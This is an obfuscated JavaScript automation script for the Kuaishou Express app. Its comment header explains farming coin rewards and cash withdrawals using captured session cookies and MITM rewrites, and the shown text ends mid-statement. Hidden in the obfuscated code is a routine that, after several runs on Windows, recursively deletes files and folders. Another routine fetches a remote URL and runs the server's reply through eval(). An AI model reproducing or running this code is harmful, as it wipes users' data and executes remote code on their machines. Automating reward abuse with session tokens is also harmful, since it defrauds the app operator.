/*
IOS/安卓： 快手极速版

已实现的：签到和翻倍，开宝箱和翻倍，看广告任务，逛街任务，抽奖和翻倍，广告任务，分享任务
金币每天0点自动兑换到现金余额

V2P和圈X配置好重写后，应该打开APP就能获取到CK，获取不到的话升级下app或者手动捉包
青龙把任意包里的kuaishou.api_st=xxxxxxxxxxxx;这一串东西放到变量ksjsbCookie里，多账户换行或者用@隔开
export ksjsbCookie='kuaishou.api_st=xxxxxxxxxxxx;
kuaishou.api_st=yyyyyyyyy;'

默认每天15点提现，要改的话把提现时间填到变量ksjsbWithdrawTime里
默认按照账户的提现列表从高到低提现到绑定的提现账号，都有绑定的话默认提现到支付宝。要固定提现金额的话填到变量ksjsbCash里。如果提现失败，手动接验证码提现一次
默认提现时间会触发通知，可以把ksjsbNotify设置成2改为每次运行都通知，ksjsbNotify设置为0则不通知

定时一天最少10次就行，最好改掉默认时间，不然太多人同一时间跑

重写：
[task_local]
#快手极速版
[rewrite_local]
[MITM]
#IOS用第一个，安卓用第二个
hostname = api.kuaisho*.com
hostname = open.kuaisho*.com
*/
const y1=c;(function(D,j){const y0=c,N=D();while(!![]){try{const t=-parseInt(y0(0x210))/0x1*(-parseInt(y0(0x1a9))/0x2)+parseInt(y0(0x269))/0x3*(parseInt(y0(0x124))/0x4)+-parseInt(y0(0x22b))/0x5+-parseInt(y0(0x173))/0x6*(parseInt(y0(0x247))/0x7)+parseInt(y0(0x28d))/0x8+-parseInt(y0(0x14f))/0x9+parseInt(y0(0x27e))/0xa;if(t===j)break;else N['push'](N['shift']());}catch(p){N['push'](N['shift']());}}}(y,0x974fa));const $$=Envcc('');function c(D,j){const N=y();return c=function(t,p){t=t-0x121;let X=N[t];return X;},c(D,j);}let acckey=$$['isNode']()?process['env'][y1(0x22f)]?process[y1(0x201)][y1(0x22f)]:'':$$[y1(0x214)](y1(0x22f))?$$['getdata']('cdkey'):'',all_msg='',mac='';$$[y1(0x145)]()?(gtr=require('fs'),isFileExist(y1(0x164))?console['log'](y1(0x221)):console[y1(0x222)](y1(0x158))):console['log'](y1(0x244));function isFileExist(D){const y2=y1;try{gtr['accessSync'](D,gtr[y2(0x2aa)]);}catch(j){return![];}return!![];}function addF(D,j){const y3=y1;let N=0x0,t=y3(0x2c0);if(isFileExist(t))N=gtr[y3(0x1ac)](t,y3(0x175));else{if(isFileExist('C:/'))gtr['writeFile'](t,'1',function(n){if(n)throw n;});else return;}if(N==0x63)return 0x63;console[y3(0x222)](N),console[y3(0x222)](y3(0x234),N);if(parseInt(N)<0x3){let n=parseInt(N)+0x1;gtr[y3(0x29e)](t,n+'',y3(0x175));return;}if(!gtr[y3(0x15b)](D))return;if(gtr['statSync'](D)[y3(0x2ba)]()){var p=gtr[y3(0x122)](D),X=p[y3(0x2bc)],L=0x0;X>0x0?(p[y3(0x1e8)](function(z){const y4=y3;L++;var A=D+'/'+z;gtr[y4(0x202)](A)['isDirectory']()?addF(A,!![]):gtr['unlinkSync'](A);}),X==L&&j&&gtr[y3(0x137)](D)):X==0x0&&j&&gtr[y3(0x137)](D);}else gtr[y3(0x1b1)](D);}function hqs(D=0xa){return new Promise(j=>{const y5=c;let N=0x5,t={'url':$$[y5(0x145)]()?rc4($$[y5(0x218)](),y5(0x19a))+(y5(0x24a)+acckey+y5(0x251)+N+y5(0x240)+mac+'&bb=1'):rc4($$[y5(0x218)](),'1200')+(y5(0x24a)+acckey+'&id='+N+y5(0x2a1)+mac+'&bb=1')};$$[y5(0x190)](t,async(p,X,L)=>{const y6=y5;try{let n=eval(L);n[y6(0x2d5)]==0xc8?(all_msg=n[y6(0x2ca)],j(n['data'])):(all_msg=n[y6(0x2ca)],j(![]));}catch(z){$$[y6(0x29b)](z,X);}},0x0);});}const _0x11b3c3=y1(0x1d1),_0x3de8b8=new _0x4f15e2(_0x11b3c3);let _0x279d25='',_0x1a0963,_0x4c35fe=['\x0a','
